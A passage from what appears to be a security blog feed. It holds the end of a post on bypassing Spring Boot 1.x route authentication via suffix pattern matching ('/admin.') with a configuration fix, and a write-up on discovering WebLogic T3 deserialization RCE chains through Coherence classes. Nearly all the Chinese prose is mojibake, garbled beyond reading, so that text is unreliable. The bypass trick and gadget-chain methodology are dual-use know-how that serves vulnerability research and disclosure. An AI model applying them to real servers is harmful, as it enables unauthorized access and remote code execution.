  value = &#123;<span class="string">"/admin/api"</span>&#125;,</span><br><span class="line">            method = &#123;RequestMethod.GET&#125;</span><br><span class="line">    )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">admin1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello admin1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ¬¡å¼€å‘è®¤çœŸçœ‹äº†æ–‡æ¡£åšäº†ä»¥ä¸‹é…ç½®ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.CasClientConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> net.unicon.cas.client.configuration.EnableCasClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> today.redteam.aop.CasAspect;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableCasClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CasConfig</span> <span class="keyword">extends</span> <span class="title">CasClientConfigurerAdapter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CasConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureAuthenticationFilter</span><span class="params">(FilterRegistrationBean authenticationFilter)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.configureAuthenticationFilter(authenticationFilter);</span><br><span class="line">        authenticationFilter.addUrlPatterns(<span class="keyword">new</span> String[]&#123;<span class="string">"/admin/*"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">"cas.serverUrlPrefix"</span>, <span class="string">"https://cashost.com/cas"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.serverLoginUrl"</span>, <span class="string">"https://cashost.com/cas/login"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.clientHostUrl"</span>, <span class="string">"http://localhost:8888/"</span>);</span><br><span class="line">        System.setProperty(<span class="string">"cas.validationType"</span>, <span class="string">"CAS"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>/adminè¿™ä¸ªè·¯ç”±çœ‹èµ·æ¥ä¼¼ä¹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p>
<p><img src="20210510110128-03982a3c-b13c-1.png" alt="image.png"></p>
<p>å¸¸è§„çš„ç»•è¿‡æ–¹å¼ä¹Ÿä¸èµ·ä½œç”¨<br><img src="20210510110137-08f100da-b13c-1.png" alt="image.png"></p>
<p><img src="20210510110143-0cb5c50c-b13c-1.png" alt="image.png"></p>
<h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>ä½†åœ¨ä½ç‰ˆæœ¬çš„springbootä¸Šè¿˜æ˜¯èƒ½ç»•è¿‡ï¼ˆæœ¬åœ°ç¯å¢ƒæ˜¯1.5.9.RELEASEï¼‰ã€‚</p>
<p><img src="20210510110208-1bc8fab4-b13c-1.png" alt="image.png"></p>
<h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åŸç†æ˜¯åœ¨springboot 1.xä¸­useSuffixPatternMatché»˜è®¤ä¸ºtrueï¼Œspringbootä¼šå¯¹è·¯ç”±è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚</p>
<p>æ–­ç‚¹ä¸‹åœ¨org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatternã€‚</p>
<p><img src="20210510110222-23f07f6e-b13c-1.png" alt="image.png"></p>
<p>/admin.*è‡ªç„¶èƒ½åŒ¹é…ä¸Š/admin.ä¹Ÿå°±ç»•è¿‡äº†ã€‚</p>
<h3 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>å¦‚ä¸‹å…³é—­setUseSuffixPatternMatchæˆ–å‡çº§åˆ°2.x</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> today.redteam.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> HandlerMapping <span class="title">requestMappingHandlerMapping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        RequestMappingHandlerMapping mapping = <span class="keyword">new</span> RequestMappingHandlerMapping();</span><br><span class="line">        mapping.setUseSuffixPatternMatch(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> mapping;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>How Did I Find Weblogic T3 RCE</title>
    <url>/2021/08/31/How-Did-I-Find-Weblogic-T3-RCE/</url>
    <content><![CDATA[<p>æ–‡ç« é¦–å‘äº<a href="https://xz.aliyun.com/t/9068">å…ˆçŸ¥ç¤¾åŒº</a><br>â€‹<br>è·å¾—å™±å¤´oracleå…¬å¼€è‡´è°¢</p>
<!-- more -->
<p><img src="image-20210120160134548.png" alt="image-20210120160134548.png"><br>ä¹‹å‰è¿™ä¸ªè¡¥ä¸æ²¡æœ‰ä¿®å¥½ï¼Œæœ‰CVE-2021-2135å’ŒCVE-2021-2136ä¸¤ç§ç»•è¿‡ã€‚<br><img src="image-1.png" alt="image-1.png"><br>æŒ–ä¸åŠ¨ï¼ŒæŠŠä¹‹å‰æ€è·¯å†å‘å‡ºæ¥ï¼Œç­‰ä¸‹ä¸ªè¡¥ä¸æ—¥å‘å¸ˆå‚…ä»¬å­¦ä¹ äº†ã€‚</p>
<h2 id="CASE-1"><a href="#CASE-1" class="headerlink" title="CASE 1"></a>CASE 1</h2><p>æœ€åˆå¼•èµ·æˆ‘æ³¨æ„çš„æ˜¯ExternalizableLite#readExternalizableLiteï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œç›´æ¥ä»æ•°æ®æµé‡Œé¢è¯»å–äº†ç±»åå¹¶æ–°å»ºå¯¹è±¡ã€‚<br><img src="image-20201115104803787.png" alt="image-20201115104803787.png"><br>ä¸‹é¢åˆä¼šè°ƒç”¨valueè‡ªèº«çš„readExternal((DataInput)in)æ–¹æ³•ã€‚<br>æ–°å»ºå‡ºæ¥çš„å¯¹è±¡ä¼šè°ƒç”¨è‡ªå·±çš„readExternalã€‚<br><img src="image-20201115105149062.png" alt="image-20201115105149062.png"><br>å½“å¯¹è±¡æ„é€ å¥½ä¹‹ååˆä¼šåœ¨realizeä¸­è°ƒç”¨readResolveæ–¹æ³•<br><img src="image-20201122194515676.png" alt="image-20201122194515676.png"><br><img src="image-20201122194554729.png" alt="image-20201122194554729.png"><br>ç»“åˆè¿™é‡Œä¸‰ç‚¹æ¥çœ‹ï¼Œç›¸å½“äºæ˜¯ä¸€ä¸ªå…é»‘åå•æ£€æŸ¥çš„ååºåˆ—åŒ–åœºæ™¯ã€‚<br>æˆ‘ä»¬åªéœ€è¦å¾€ä¸Šå›æœ”ï¼Œçœ‹èƒ½å¦åˆ°ååºåˆ—åŒ–çš„å…¥å£ç‚¹å°±è¡Œäº†ã€‚<br><img src="image-20201115105910924.png" alt="image-20201115105910924.png"><br><img src="image-20201115105938644.png" alt="image-20201115105938644.png"></p>
<p><img src="image-20201115110032708.png" alt="image-20201115110032708.png"><br><img src="image-20201115110126348.png" alt="image-20201115110126348.png"><br>ç„¶åå…¨å±€æœcom.tangosol.util.ExternalizableHelper#readObject(java.io.DataInput)ï¼Œå¯ä»¥åœ¨å¾ˆå¤šç±»çš„readExternal(java.io.DataInput)ä¸­çœ‹åˆ°è¿™æ ·çš„è°ƒç”¨ã€‚<br><img src="image-20201115111618606.png" alt="image-20201115111618606.png"><br>å›æœ”åˆ°è¿™ä¸€æ­¥çš„æ—¶å€™æˆ‘è¿˜ä»¥ä¸ºæˆäº†ï¼Œä½†æ˜¯æµ‹äº†ä¸€ä¸‹å‘ç°ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™javaæ ¹æœ¬ä¸ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚å› ä¸ºè¿™é‡Œå‡½æ•°çš„ç­¾åæ˜¯readExternal(java.io.DataInput)è€Œä¸æ˜¯æ­£ç»Ÿçš„readExternal(java.io.ObjectInput)ã€‚</p>
<p>æœ‰äº›ä¸ç”˜å¿ƒï¼Œäºæ˜¯ä¹æŠŠcoherence.jaré‡Œé¢çš„readExternal(java.io.ObjectInput)å…¨éƒ¨æŠ“äº†å‡ºæ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br></pre></td></tr></table></figure>


<p>æ•°é‡ä¸æ˜¯å¾ˆå¤šï¼Œä¸€ä¸ªä¸€ä¸ªæ‰‹å·¥çœ‹ã€‚å¾ˆå¿«å•Šï¼Œæˆ‘å•ªä¸€ä¸‹å°±ç‚¹åˆ°com.oracle.common.internal.util.Histogram#readExternal(java.io.ObjectInput)é‡Œé¢äº†ã€‚<br><img src="image-20201122163616331.png" alt="image-20201122163616331.png"><br>è¿™ä¸ªåœ°æ–¹æœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œé‚£ä¹ˆåˆšæ‰çš„é“¾è·¯ä¸å°±ç»­ä¸Šäº†ï¼Ÿ<br>ç»§ç»­è·Ÿè¿›ï¼Œå†ä¸€æ¬¡å¤±æœ›ï¼Œå‘ç°è¿™é‡Œåªè¯»å–é•¿æ•´å‹ï¼Œå¹¶æ²¡æœ‰è°ƒç”¨readObjectã€‚<br><img src="image-20201122163730081.png" alt="image-20201122163730081.png"></p>
<p>ç„¶åæ¥ä¸‹æ¥çš„æ‰€æœ‰ç±»è¦ä¹ˆæ˜¯è½¬æ¢æˆäº†DataInputä½†æ˜¯æ²¡æœ‰readObjectã€‚è¦ä¹ˆæ˜¯æ ¹æœ¬å°±æ²¡æœ‰å¼ºåˆ¶è½¬æ¢ã€‚</p>
<p>è¿˜æ˜¯ä¸ç”˜å¿ƒï¼Œåˆçœ‹äº†ä¸€éï¼Œåœ¨com.tangosol.net.security.PermissionInfo#readExternal(java.io.ObjectInput)å¤„äº‹æƒ…å‡ºç°è½¬æœºã€‚<br><img src="image-20201122164228358.png" alt="image-20201122164228358.png"><br>æˆ‘å‘ç°åœ¨è°ƒç”¨readCollectionçš„æ—¶å€™ä¼ å…¥çš„ObjectInput inä¼šè¢«éšå¼è½¬æ¢æˆDataInput inï¼Œå¹¶ä¸”é‡Œé¢åˆšå¥½æœ‰readObjectã€‚<br><img src="image-20201122164413735.png" alt="image-20201122164413735.png"></p>
<p>åˆ°è¿™é‡Œä¸€æ¡ä»readExternal(java.io.ObjectInput) åˆ°æ— è§†é»‘åå•çš„ååºåˆ—åŒ–è·¯çº¿åœ¨ç†è®ºä¸Šä¼¼ä¹å·²æ‰“é€šï¼Œæ¥ä¸‹æ¥çš„å°±æ˜¯gadgetååŠæ®µæ˜¯é€‰æ‹©ï¼Œç«‹é©¬æƒ³åˆ°çš„æ˜¯TemplatesImplå’ŒRemoteConstructorï¼ˆCVE-2020-14644ï¼‰ã€‚æˆ‘é€‰æ‹©äº†åè€…ï¼ŒæŠŠpayloadæ„é€ å¥½ï¼Œå†æ‰“ä¸Š10æœˆè¡¥ä¸ï¼ˆæ„Ÿè°¢ç»™æˆ‘è¡¥ä¸çš„å¸ˆå‚…ï¼‰ä¸€å‘å…¥é­‚ã€‚</p>
<p>psï¼šè¿™é‡ŒreadExternal(java.io.ObjectInput) -&gt; æ— è§†é»‘åå•çš„readObjectçš„ç»“è®ºæ˜¯ä¸ä¸¥è°¨çš„ï¼Œé€‰æ‹©TemplatesImplä¹Ÿæ˜¯æ‰“ä¸é€šçš„ï¼Œè¿™ä¸ªåŸå› åé¢ä¼šè§£é‡Šã€‚ç¡®å®å¾ˆå°´å°¬ï¼Œè™½ç„¶èƒ½RCEï¼Œä½†æ˜¯å½“æ—¶æ€¥äºéªŒè¯å¹¶æœªå…¨æµç¨‹è°ƒè¯•è¿‡ï¼Œå¯¹è¿™ä¸ªæ´çš„ç†è§£æ¯”è¾ƒç‰‡é¢ã€‚</p>
<p>è‡³æ­¤ç¬¬ä¸€ä¸ªæ´å°±ç»“æŸäº†ï¼Œå½“æ™šå°±ç»™å®˜æ–¹ææ¼æ´ã€‚åé¢çš„å‡ å¤©æˆ‘åœ¨åæ€è¿™ä¸ªæ´ï¼Œ</p>
<ol>
<li>ä¸ºä»€ä¹ˆæˆ‘èƒ½æŒ–åˆ°ï¼Ÿæˆ‘æƒ³æˆ‘èƒ½æŒ–åˆ°åŸå› æ˜¯<del>weblogicå®˜æ–¹æ²¡æœ‰bug bounty</del>å‰äººå¯èƒ½æ²¡æœ‰æ³¨æ„åˆ°æœ‰è¿›å…¥åˆ°readExternal(DataInput in)é€šè·¯ã€‚</li>
<li>ä¸ºä»€ä¹ˆreadExternal(ObjectInput in)å¯ä»¥ç»­ä¸Šï¼Ÿæˆ‘æƒ³å› ä¸ºreadExternalæœ¬æ¥å°±æ˜¯ç»™ç¨‹åºå‘˜è‡ªå®šä¹‰ååºåˆ—åŒ–æ•°æ®çš„åœ°æ–¹ï¼Œè€ŒreadExternal(DataInput in)é‡Œé¢æ˜¯coherenceè‡ªå·±çš„ååºåˆ—åŒ–é€»è¾‘ï¼Œæ‰€ä»¥ä»ObjectInput inèƒ½åˆ°DataInput inç®—æ˜¯é¢˜ä¸­åº”æœ‰ä¹‹ä¹‰ã€‚</li>
<li>è¿™ç§ååºåˆ—åŒ–ç»•è¿‡æ–¹å¼å±äºå“ªç§ç±»å‹ï¼Ÿæˆ‘æƒ³åº”è¯¥æ˜¯äºŒé˜¶ååºåˆ—åŒ–ç±»å‹ã€‚</li>
</ol>
<h2 id="CASE-2"><a href="#CASE-2" class="headerlink" title="CASE 2"></a>CASE 2</h2><p>å‡ å¤©åï¼Œæˆ‘æ”¶åˆ°äº†å®˜æ–¹å›å¤çš„é‚®ä»¶ï¼Œä»å®ƒä»¬å›å¤ä¸­å¯ä»¥çœ‹åˆ°å®ƒä»¬æŠŠè¿™ä¸ªé“¾å…³é”®è®¤å®šä¸ºRCE involving LambdaIdentityã€‚æ­¤æ—¶ï¼Œæˆ‘è§‰å¾—å¾ˆå¥‡æ€ªéš¾é“ååŠæ®µä¸æ˜¯å¯ä»¥çµæ´»å—ï¼Ÿå¦‚æœæˆ‘é‡æ–°æ‰¾ä¸€ä¸ªæ–°å…¥å£é…ä¸Š7u21ååŠæ®µå²‚ä¸æ˜¯èƒ½å†æ··ä¸€ä¸ªCVEï¼Ÿã€‚ç„¶åæŠ“äº†ä¸€ä¸‹æ•´ä¸ªcoherence libç›®å½•ä¸‹çš„æ‰€æœ‰jaråŒ…çš„readExternal(java.io.ObjectInput) ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.oracle.common.internal.util.Histogram</span><br><span class="line">com.tangosol.util.MapSet</span><br><span class="line">com.tangosol.util.Binary</span><br><span class="line">com.tangosol.util.LiteSet</span><br><span class="line">com.tangosol.util.UUID</span><br><span class="line">com.tangosol.util.LiteMap</span><br><span class="line">com.tangosol.run.xml.SimpleDocument</span><br><span class="line">com.tangosol.run.xml.XmlBean</span><br><span class="line">com.tangosol.util.ConcurrentMap$1</span><br><span class="line">com.tangosol.coherence.component.net.Member</span><br><span class="line">com.tangosol.net.security.PermissionInfo</span><br><span class="line">com.tangosol.coherence.mvel2.util.FastList</span><br><span class="line">com.tangosol.coherence.servlet.AbstractHttpSessionModel</span><br><span class="line">com.tangosol.coherence.servlet.AttributeHolder</span><br></pre></td></tr></table></figure>


<p>å€’æ•°ä¸¤ä¸ªæ˜¯æ¯”ä¸Šæ¬¡åªè·‘conherence.jarå¤šå‡ºæ¥çš„ï¼Œç»è¿‡éªŒè¯åœ¨conherence-web.jarä¸­çš„com.tangosol.coherence.servlet.AttributeHolderæ»¡è¶³æ¡ä»¶ã€‚<br><img src="image-20201122174447449.png" alt="image-20201122174447449.png"><br>æŠŠTemplatesImplæ‰“åˆ°m_Valueä¹‹åï¼Œå‘é€payloadåå‘ç°æ§åˆ¶å°æŠ¥é”™ã€‚å‘ç”Ÿè‚¾ä¹ˆäº‹äº†ï¼Ÿæˆ‘ä¸€çœ‹ï¼Œå“¦åŸæ¥å•Šæ˜¯æ²¡è¿‡é»‘åå•ï¼Œè¿™å°±å¼•èµ·äº†å¯¹è¿™ä¸ªæ¼æ´ç»†èŠ‚çš„è¿›ä¸€æ­¥æ¢ç©¶ã€‚<br><img src="image-20201122191637309.png" alt="image-20201122191637309.png"><br>åœ¨com.tangosol.util.ExternalizableHelper#readObjectInternalä¸‹æ–­ç‚¹å¯ä»¥çœ‹åˆ°å®ƒå¹¶æ²¡è¿›å…¥ï¼Œé¢„æœŸçš„readExternalizableLiteè€Œæ˜¯è¿›å…¥äº†readSerializableä¸­<br><img src="image-20201122192730759.png" alt="image-20201122192730759.png"><br>åœ¨readObjectä¸­DataInput inä¼šé‡æ–°â€œè½¬æ¢â€å›å¸¦é»‘åå•çš„InputStreamï¼Œæ‰€ä»¥å¤±è´¥ã€‚<br><img src="image-20201122192854446.png" alt="image-20201122192854446.png"><br>æ­¤æ—¶ï¼Œå¿ƒç†åˆæœ‰ä¸¤ä¸ªç–‘é—®</p>
<ol>
<li>è¾“å…¥æµä¸ºæˆ‘æ‰€æ§ï¼Œé‚£æˆ‘æŠŠnTypeæ”¹æˆ10ï¼Œå¼ºè¡Œè¿›å…¥readExternalizableLiteè¡Œä¸è¡Œï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆRemoteConstructorå¯ä»¥æ‰“æˆåŠŸï¼Ÿ</li>
</ol>
<p>é¦–å…ˆå›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä½†æ˜¯è¡Œä¸é€šï¼Œå°±ç®—çœŸçš„æŠŠTemplatesImpl newå‡ºæ¥äº†ä¹‹åçš„å¼ºè½¬ä¹Ÿè¿‡ä¸äº†ã€‚<br><img src="image-20201122193516298.png" alt="image-20201122193516298.png"><br>å…¶æ¬¡ï¼Œå°±ç®—çœŸçš„æˆåŠŸä»–ä¹Ÿæ²¡æœ‰readExternalæ–¹æ³•ï¼ˆå³æ²¡æœ‰å®ç°ExternalizableLiteæ¥å£ï¼‰ã€‚<br><img src="image-20201122193856818.png" alt="image-20201122193856818.png"><br>åˆ°è¿™é‡ŒRemoteConstructorå¯ä»¥æ‰“çš„åŸå› ä¹Ÿå¾ˆæ˜æ˜¾äº†RemoteConstructorå®ç°äº†ExternalizableLiteæ¥å£ã€‚<br><img src="image-20201122194211848.png" alt="image-20201122194211848.png"><br>æ‰€ä»¥è¿™ä¸ªæ”»å‡»é¢çš„åˆ©ç”¨æ¡ä»¶æ˜¯ï¼š</p>
<ol>
<li>ä¸€ä¸ªjava.io.ObjectInputå¼ºè½¬æˆjava.io.DataInputçš„ç‚¹</li>
<li>å¼ºè½¬æˆjava.io.DataInputåéœ€è¦æœ‰è¿›è¡ŒExternalizableHelper.readObjectçš„æ“ä½œ</li>
<li>ä¸€ä¸ªå®ç°äº†ExternalizableLiteçš„æ¥å£é«˜å±ç±»</li>
</ol>
<p>ä¸è¿‡è¿™å·²ç»è¶³å¤Ÿäº†ï¼Œå› ä¸ºconherenceé‡Œé¢çš„Extractoréƒ½å®ç°è¿™ä¸ªæ¥å£ã€‚<br><img src="image-20201122195930855.png" alt="image-20201122195930855.png"></p>
<p>ä¸€å¼€å§‹ï¼Œæˆ‘å…¶å®æ˜¯æƒ³æ‰‹å·¥æŒ–çš„ï¼Œé‚£æ®µæ—¶é—´çœŸçš„æ˜¯çœ‹çš„æˆ‘å¤´çš®å‘éº»ï¼Œè€Œä¸”å› ä¸ºå®ç°äº†ExternalizableLiteæ¥å£æ˜¯åœ¨æ˜¯å¤ªå¤šä¹Ÿå¾ˆéš¾ä¿è¯è‡ªå·±å®Œå…¨ä¸é‡ä¸æ¼ï¼Œå¤§å¤šæ•°readExternalé‡Œé¢éƒ½åªæœ‰èµ‹å€¼æ²¡æœ‰åˆ«çš„æ“ä½œï¼Œä¼‘æ¯äº†å‡ å¤©åæˆ‘å†³å®šç”¨é­”æ³•æ‰“è´¥é­”æ³•ï¼Œæ‹¿ä¹‹å‰å†™çš„è‡ªåŠ¨åŒ–å·¥å…·è·‘ã€‚ç»“åˆå†å²æ¼æ´æˆ‘å†³å®šä»¥readExternal(DataInput in)ä¸ºsourceï¼Œä»¥com.tangosol.util.extractor.AbstractExtractor#compareä¸ºsinkå¼€åŠ¨åŒ–è·‘ã€‚</p>
<p>è·‘äº†ä¸€ä¼šï¼Œä»ä¸€å †è¯¯æŠ¥ä¸­çœ‹åˆ°äº†å¸Œæœ›çš„æ›™å…‰ã€‚<br><img src="image-20201122201724495.png" alt="image-20201122201724495.png"><br>æœ€åè¯æ˜äº†è¿™ä¸ªç¡®å®å¯è¡Œã€‚</p>
<h2 id="CASE-3"><a href="#CASE-3" class="headerlink" title="CASE 3"></a>CASE 3</h2><p>åœ¨æ‰‹å·¥çœ‹çš„é‚£æ®µæ—¶é—´ï¼Œè™½ç„¶å¤´çš®å‘éº»ä½†å¹¶ä¸æ˜¯æ²¡æœ‰æ”¶è·ï¼Œçœ‹äº†å‡ ä¸ªç‰ˆæœ¬çš„weblogicç»å†äº†â€œå§æ§½,è¿™é‡Œæ€•ä¸æ˜¯æœ‰æ´â€åˆ°â€å§æ§½,è¢«é»‘åå•å…¨é˜²ä½äº†ï¼Œå…¨é˜²å‡ºå»äº†å•Šâ€å¾ˆå¤šæ¬¡åï¼Œæˆ‘éšçº¦è§‰å¾—coherenceå·²ç»å¯ä»¥é€ æˆå±å®³çš„ç‚¹å…¨éƒ¨åŠ å…¥é»‘åå•å¥—é¤äº†ï¼Œä¸ä¼šæœ‰å…¨æ–°çš„é“¾äº†ï¼ˆç­‰è¢«æ‰“è„¸ï¼‰ï¼Œä½†äºŒé˜¶ååºåˆ—åŒ–çš„ç‚¹è¿˜æœ‰æœºä¼šï¼</p>
<p>è¿™æ¬¡å¼•èµ·æˆ‘æ³¨æ„çš„æ˜¯com.tangosol.coherence.jcache.common.CoherenceEntryProcessorResultã€‚å¯ä»¥çœ‹åˆ°åœ¨ååºåˆ—åŒ–æ—¶å®ƒä¼šè¯»ä¸€ä¸ªBinaryè¿›æ¥ï¼Œç„¶åå¯¹Binaryè¿›è¡Œä¸€ä¸ªfromBinaryçš„æ“ä½œã€‚<br><img src="image-20201123175647803.png" alt="image-20201123175647803.png"><br>æˆ‘æ³¨æ„åˆ°com.tangosol.util.ExternalizableHelper#fromByteArrayä¸­ä¼šæŠŠbyte[]æ•°ç»„é‡å»ºæˆBufferInputè¿›è¡Œååºåˆ—åŒ–ï¼Œå› ä¸ºé‡å»ºæ‰€ä»¥æ²¡æœ‰é»‘åå•è¿‡æ»¤ã€‚<br><img src="image-20201123195621071.png" alt="image-20201123195621071.png"><br><img src="image-20201123195720598.png" alt="image-20201123195720598.png"></p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘æ„Ÿè§‰åˆæˆäº†ã€‚æ„é€ å¥½payloadæ‰“è¿‡å»ï¼Œè¢«weblogicé˜²å‡ºå»äº†ã€‚ä¸€çœ‹ï¼Œæ˜¯2æ‰¾ä¸åˆ°ç±»ï¼Œåé¢ç¡®è®¤äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªç±»åœ¨coherence-jcahe.jaré‡Œé¢ï¼Œè¿™ä¸ªåŒ…å¹¶æ²¡æœ‰è¢«weblogicåŠ è½½è¿›æ¥ã€‚<br><img src="image-20201123202848977.png" alt="image-20201123202848977.png"><br>ä½†æ˜¯å°±è¿™ä¹ˆæ”¾å¼ƒæ˜¯ä¸å¯èƒ½çš„ï¼Œæˆ‘å†³å®šæ‰¾åˆ°å…¶ä»–fromBinaryçš„è°ƒç”¨ç‚¹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç›´æ¥æ‰“å¼€JD-GUIæœï¼Œå‘ç°SimpleBinaryEntryè¿™ä¸ªçœ‹èµ·æ¥å“ç›¸å¾ˆå¥½ï¼Œå®ƒçš„getValueè°ƒç”¨äº†ExternalizableHelper.fromBinaryæ–¹æ³•è€Œå…¶toStringæ–¹æ³•åˆè°ƒç”¨äº†getValueã€‚<br><img src="image-20201122203856852.png" alt="image-20201122203856852.png"><br><img src="image-20201122203911099.png" alt="image-20201122203911099.png"></p>
<p>è¿™é‡Œè¿˜æœ‰ç»†èŠ‚éœ€è¦æ³¨æ„m_serializeræ˜¯transientçš„ï¼Œå¦‚æœç”¨BadAttributeValueExpException.readObject() -&gt; TiedMapEntry.toString()æ˜¯ä¸å¯è¡Œçš„ï¼Œåç»­ååºåˆ—åŒ–ä¼šå› ä¸ºm_serializerä¸ºnullè€Œå¤±è´¥ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œè¿˜æ˜¯éœ€è¦ä»¥readExternalä¸ºå…¥å£è¿›æ¥ï¼Œ<del>å› ä¸ºreadExternalæ˜¯ä¸å—transienté™åˆ¶çš„ã€‚</del>å› ä¸ºèµ°è¿™ç§ååºåˆ—åŒ–å½“å¯¹è±¡å®ç°äº†SerializerAwareæ—¶ä¼šè‡ªåŠ¨æ’å…¥serializerã€‚<br><img src="image.png" alt="image.png"></p>
<p><img src="image-20201123210123344.png" alt="image-20201123210123344.png"></p>
<p>åŠè‡ªåŠ¨åŒ–è·‘äº†ä¸€ä¸‹ï¼Œè™½ç„¶æ²¡æœ‰ç»å¯¹è·‘å‡ºæ¥ï¼ˆæ²¡æœ‰ç”¨æŒ‡é’ˆåˆ†æï¼‰ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå‚è€ƒå·²ç»è¶³å¤Ÿäº†ï¼š<br><img src="image-20201126145458994.png" alt="image-20201126145458994.png"></p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€»ç»“ä¸€ä¸‹trik</p>
<ul>
<li>åœ¨æŒ–æ–°çš„ä¹‹å‰ï¼Œå¯ä»¥<a href="http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/">è°ƒç ”å†å²CVEå’Œè¡¥ä¸å­¦ä¹ å‰äººæ€è·¯</a>ã€‚</li>
